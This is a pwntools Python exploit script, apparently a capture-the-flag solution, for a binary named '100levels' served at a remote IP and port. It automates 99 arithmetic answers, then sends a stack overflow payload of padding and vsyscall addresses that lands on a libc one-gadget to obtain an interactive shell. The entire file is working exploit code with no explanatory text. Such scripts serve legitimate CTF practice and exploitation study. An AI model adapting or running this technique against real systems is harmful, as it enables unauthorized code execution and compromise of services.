#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = '100levels'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "124.126.19.106"
remotePort = 56962

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------


#--------------------------Exploit--------------------------
def exploit():
	li(rl())
	sla('Choice:\n', '2'); # full system addr in stack
	gadget = 0x4526a
	offset = gadget - lib.sym['system']
	sla('Choice:\n', '1')
	sla('?\n', '0')

	sla('Any more?\n', str(offset))
	for i in range(0, 99):
		ru('Question: ')
		a = int(ru(' * '))
		b = int(ru(' ='))
		sla('Answer:', str(a * b))

	vsyscall = 0xffffffffff600000
	p = 'A' * 0x38 + p64(vsyscall) * 3
	#db()
	sa('Answer:', p)
	
	

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
